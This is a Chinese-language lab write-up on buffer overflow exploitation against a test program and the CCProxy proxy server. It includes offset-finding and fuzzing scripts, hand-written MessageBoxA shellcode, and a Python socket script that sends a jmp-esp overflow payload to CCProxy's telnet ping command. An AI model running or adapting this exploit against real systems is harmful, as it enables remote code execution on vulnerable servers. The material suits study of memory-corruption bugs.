---
title: 缓冲区溢出实验
tags: [逆向工程分析]
date: 2017-04-22 20:11
---
缓冲区溢出是一种非常普遍、非常危险的漏洞，在各种操作系统、应用软件中广泛存在。利用缓冲区溢出攻击，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，可以利用它执行非授权指令，甚至可以取得系统特权，进而进行各种非法操作。
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><p><div class="toc">
<ul>
<li><a href="#0x01-缓冲区溢出简介">0x01 缓冲区溢出简介</a></li>
<li><a href="#0x02-实验要求">0x02 实验要求</a></li>
<li><a href="#0x03-实验内容">0x03 实验内容</a><ul>
<li><a href="#0x1-定位溢出点">0x1 定位溢出点</a></li>
<li><a href="#0x2-ida查看溢出函数">0x2 IDA查看溢出函数</a></li>
<li><a href="#0x3-溢出调试">0x3 溢出调试</a></li>
<li><a href="#0x4-编写shellcode">0x4 编写shellcode</a></li>
<li><a href="#0x5-发送shellcode">0x5 发送shellcode</a></li>
</ul>
</li>
<li><a href="#0x04-问题">0x04 问题</a></li>
<li><a href="#0x05-实验总结">0x05 实验总结</a></li>
</ul>
</div>
</p>
<h1 id="0x01-缓冲区溢出简介">0x01 缓冲区溢出简介</h1>
<blockquote>
<p>缓冲区溢出是一种非常普遍、非常危险的漏洞，在各种操作系统、应用软件中广泛存在。利用缓冲区溢出攻击，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，可以利用它执行非授权指令，甚至可以取得系统特权，进而进行各种非法操作。</p>
</blockquote>
<h1 id="0x02-实验要求">0x02 实验要求</h1>
<p><code>1.请对stackoverflow.exe和CCProxy.rar的溢出点（即输入数据长度为多少时，程序会发生溢出）进行定位。</code> <br>
<code>2.根据你定位的溢出点，思考：如果你的Shellcode长度为500字节，那么在两种情况下，Shellcode放在参数的什么位置比较有利用执行？</code> <br>
<code>3.在以上基础上完成一次shellcode的植入与运行。 <br>
要求 <br>
(1)Shellcode功能不限，可以是开端口、运行计算器（记事本）、添加帐号等 均可。 <br>
(2)Shellcode要求能够以参数的方式植入并覆盖栈空间。 <br>
(3）返回地址的EIP处只能填写jmp esp指令地址，不得填写shellcode的地址硬编码。</br></br></br></br></code></br></br></p>
<h1 id="0x03-实验内容">0x03 实验内容</h1>
<h2 id="0x1-定位溢出点">0x1 定位溢出点</h2>
<p><strong>stackoverflow</strong> <br>
</br></p><center> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170422193200022?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
 图1 用OD调试程序</br></img></br></center><p></p>
<p>找到程序执行的地方，并下断点 <br>
</br></p><center> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170422193900578?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
图2 在程序入口下断点</br></img></br></center><p></p>
<p>在OD中找到栈溢出的地方 <br>
</br></p><center> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170422194226618?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
    图3 堆栈情况</br></img></br></center><p></p>
<p>在上图中发现输入长度为20个字节的时候正好能将<code>ret</code>地址覆盖 <br>
当长度为16字节时（最后有截断字符0x00 地址变为了0x401100）恰好能将返回地址设置到程序执行前，以此来实现重复执行。 <br>
</br></br></p><center> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170422194943904?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
    图4 输入长度为16</br></img></br></center><p></p>
<p>利用IDA反汇编的结果，可以直接看到产生溢出的函数 <br>
</br></p><center> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170422200628102?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
图5 反汇编 <br>
发现产生溢出的strcpy函数，因为程序没有对argv的长度进行限制</br></br></img></br></center><p></p>
<p><strong>CCproxy</strong></p>
<ul>
<li>特定字符</li>
</ul>
<pre class="prettyprint"><code class="language-python hljs ">s = <span class="hljs-string">''</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):
        <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):
            <span class="hljs-keyword">for</span>(n) <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):
                s += str(i)+str(j)+str(m)+str(n)
                <span class="hljs-keyword">if</span> len(s) == <span class="hljs-number">2000</span> :
                    <span class="hljs-keyword">print</span> s</code></pre>
<p>生成字节序不同的2000个字节 <br>
</br></p><center> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170422223547612?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
图6 生成不同字节</br></img></br></center><p></p>
<p></p><center> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170422223749910?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
图7 OD堆栈</br></img></br></center><p></p>
<p>可以看到EIP的值前面是高字节后面是低字节 则为0253 <br>
</br></p><center> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170422223904560?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
 图8 搜索字符</br></img></br></center><p></p>
<p>长度为1012位</p>
<ul>
<li>脚本爆破</li>
</ul>
<pre class="prettyprint"><code class=" hljs livecodeserver">
import <span class="hljs-built_in">socket</span>
s = <span class="hljs-built_in">socket</span>.<span class="hljs-built_in">socket</span>(<span class="hljs-built_in">socket</span>.AF_INET, <span class="hljs-built_in">socket</span>.SOCK_STREAM)
s.connect((<span class="hljs-string">"192.168.43.254"</span>, <span class="hljs-number">23</span>))
<span class="hljs-built_in">num</span> = <span class="hljs-number">15</span>
<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
    s.<span class="hljs-built_in">send</span>(<span class="hljs-string">'ping'</span>+<span class="hljs-string">'A'</span>*<span class="hljs-built_in">num</span>+<span class="hljs-string">'\n'</span>) <span class="hljs-comment">#000a0d42 1013 0a0d4242 1014 0042000a 1011</span>
    <span class="hljs-keyword">string</span> = s.recv(<span class="hljs-number">4096</span>)   
    print <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">if</span> <span class="hljs-string">'Host'</span> <span class="hljs-operator">in</span> <span class="hljs-keyword">string</span> <span class="hljs-operator">or</span> <span class="hljs-string">'CCProxy'</span> <span class="hljs-operator">in</span> <span class="hljs-keyword">string</span> <span class="hljs-operator">or</span> <span class="hljs-string">'be'</span> <span class="hljs-operator">in</span> <span class="hljs-keyword">string</span>:
        strtt = <span class="hljs-number">1</span>
    <span class="hljs-keyword">else</span>:
        print <span class="hljs-string">'no'</span>
        print  <span class="hljs-built_in">num</span>
    <span class="hljs-built_in">num</span> += <span class="hljs-number">1</span></code></pre>
<p></p><center> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170422224019500?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
图9 爆破寻找</br></img></br></center><p></p>
<h2 id="0x2-ida查看溢出函数">0x2 IDA查看溢出函数</h2>
<p>利用IDA字符串搜索<code>Host not found</code>查找溢出函数位置 <br>
</br></p><center> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170422224600820?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170422224627821?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170422224635227?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
图10 寻找溢出函数</br></img></br></img></br></img></br></center><p></p>
<h2 id="0x3-溢出调试">0x3 溢出调试</h2>
<p>首先根据IDA的静态分析设置调试断点0x430524 <br>
发送2000个字节 <br>
</br></br></p><center> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170422232446404?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
图11 堆栈情况</br></img></br></center><p></p>
<p>发现程序只拷贝1024个字节后面再长的字节都会被前面的覆盖</p>
<h2 id="0x4-编写shellcode">0x4 编写shellcode</h2>
<p>1.找到messagebox的函数地址 <br>
利用自己编写的弹窗函数寻找 <br>
</br></br></p><center> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170422234711888?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
图12 寻找地址</br></img></br></center><p></p>
<p>0x77D507EA</p>
<p><code>jmp esp</code>地址选用<code>\x12\x45\xfa\x7f</code> <br>
messagebox函数的参数有四个</br></p>
<pre class="prettyprint"><code class=" hljs avrasm"><span class="hljs-number">33</span> DB  XOR EBX,EBX  压入NULL结尾的”failwest”字符串。之所以用EBX清零后入栈做为字符串的截断符，是为了避免“<span class="hljs-keyword">PUSH</span> <span class="hljs-number">0</span>”中的NULL，否则植入的机器码会被strcpy函数截断。
<span class="hljs-number">53</span>                  <span class="hljs-keyword">PUSH</span> EBX  
<span class="hljs-number">68</span> <span class="hljs-number">77</span> <span class="hljs-number">65</span> <span class="hljs-number">73</span> <span class="hljs-number">74</span>  <span class="hljs-keyword">PUSH</span> <span class="hljs-number">74736577</span>  
<span class="hljs-number">68</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">69</span> <span class="hljs-number">6</span>C  <span class="hljs-keyword">PUSH</span> <span class="hljs-number">6</span>C696166  
<span class="hljs-number">8</span>B C4                <span class="hljs-keyword">MOV</span> EAX,ESP  EAX里是字符串指针
<span class="hljs-number">53</span>                  <span class="hljs-keyword">PUSH</span> EBX  四个参数按照从右向左的顺序入栈，分别为:                                          (<span class="hljs-number">0</span>,failwest,failwest,<span class="hljs-number">0</span>)                                                
<span class="hljs-number">50</span>                   <span class="hljs-keyword">PUSH</span> EAX  
<span class="hljs-number">50</span>                   <span class="hljs-keyword">PUSH</span> EAX  
<span class="hljs-number">53</span>                   <span class="hljs-keyword">PUSH</span> EBX  
B8 EA <span class="hljs-number">04</span> D8 <span class="hljs-number">77</span>  <span class="hljs-keyword">MOV</span> EAX, <span class="hljs-number">0x77D804EA</span>  调用MessageBoxA。注意不同的机器这里的                                    
                                                                    函数入口地址可能不同，请按实际值填入!
FF D0                 <span class="hljs-keyword">CALL</span> EAX  </code></pre>
<h2 id="0x5-发送shellcode">0x5 发送shellcode</h2>
<p>下面利用python socket连接CCproxy</p>
<pre class="prettyprint"><code class="language-python hljs "><span class="hljs-keyword">import</span> socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((<span class="hljs-string">"192.168.43.254"</span>, <span class="hljs-number">23</span>))
string = s.recv(<span class="hljs-number">4096</span>) 
<span class="hljs-keyword">print</span> string
s.send(<span class="hljs-string">'ping'</span>
    +<span class="hljs-string">'\x90\x90\x90\x90'</span>
    +<span class="hljs-string">'\x53\x68\x79\x71\x20\x20\x68\x68\x61\x63\x6b\x8B\xC4\x53\x50\x50\x53\xB8\xEA\x07\xD5\x77\xFF\xD0'</span>
    +<span class="hljs-string">'\x41'</span>*<span class="hljs-number">984</span>
    +<span class="hljs-string">'\x12\x45\xfa\x7f'</span>
    +<span class="hljs-string">'\x91\x92\x93\x94\x95\x96\x97\x98\x99\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'</span>+<span class="hljs-string">'\r\n'</span>) 
string = s.recv(<span class="hljs-number">4096</span>)
<span class="hljs-keyword">print</span> string</code></pre>
<p>测试效果</p>
<p></p><center> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170423001627850?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
图13 shellcode效果</br></img></br></center><p></p>
<h1 id="0x04-问题">0x04 问题</h1>
<p>虽然知道了溢出是函数sprintf造成的，但是还是不了解为什么只复制了1024个字节，后面的又被前面的覆盖掉了。</p>
<h1 id="0x05-实验总结">0x05 实验总结</h1>
<p>缓冲区溢出的实验是我对程序溢出利用有了深刻的认识理解，通过调试软件漏洞大大增长了自己的动手实践能力。同时还找到了自己不足的方面。希望在以后的学习中更加丰富自己。</p></div>